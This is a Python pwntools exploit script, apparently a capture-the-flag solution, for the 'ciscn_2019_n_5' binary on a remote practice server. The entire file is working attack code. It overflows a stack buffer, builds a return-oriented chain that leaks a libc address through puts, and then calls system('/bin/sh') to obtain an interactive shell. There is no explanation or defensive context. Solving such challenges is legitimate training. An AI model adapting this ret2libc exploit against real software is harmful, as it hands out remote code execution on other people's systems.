from pwn import *

context.log_level = "info"
LOCAL_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_LIBC = "./libc6_2.27-3ubuntu1_amd64.so"
REMOTE_ADDR = "node4.buuoj.cn"
REMOTE_PORT = 27884

elf = ELF("./ciscn_2019_n_5")
pop_rdi_ret = 0x0000000000400713
pop_rsi_pop_r15_ret = 0x0000000000400711
ret = 0x00000000004004c9

if len(sys.argv) == 2:
    libc = ELF(LOCAL_LIBC)
    if sys.argv[1] == "l":
        sock = process(elf.path)
    elif sys.argv[1] == "d": # Debug
        gs = """
            break *0x4007c0
            continue
        """
        sock = gdb.debug(elf.path, gdbscript = gs)
else:
    libc = ELF(REMOTE_LIBC)
    sock = remote(REMOTE_ADDR, REMOTE_PORT)


def leak_libc_baes_addr():
    global libc_base_addr
    sock.sendafter(b"tell me your name\n", b"A")

    sleep(0.5)
    payload = b"A" * 0x28 
    payload += p64(pop_rdi_ret)
    payload += p64(elf.got["gets"])
    payload += p64(elf.plt["puts"])
    payload += p64(elf.sym["_start"])
    sock.sendlineafter(b"What do you want to say to me?\n", payload)
    leak_data = sock.recvline()
    gets_got_addr = u64(leak_data[:-1].ljust(8, b"\x00"))
    log.success("gets_got_addr = " + hex(gets_got_addr))
    libc_base_addr = gets_got_addr - libc.sym["gets"]
    log.success("libc_base_addr = " + hex(libc_base_addr))

def attack():
    sock.sendafter(b"tell me your name\n", b"/bin/sh\x00")
    sleep(0.5)
    payload = b"A" * 0x28 
    payload += p64(pop_rdi_ret)
    payload += p64(elf.sym["name"])
    payload += p64(ret)
    payload += p64(libc_base_addr + libc.sym["system"])
    sock.sendlineafter(b"What do you want to say to me?\n", payload)

if __name__ == "__main__":
    leak_libc_baes_addr()
    attack()
    sock.interactive()



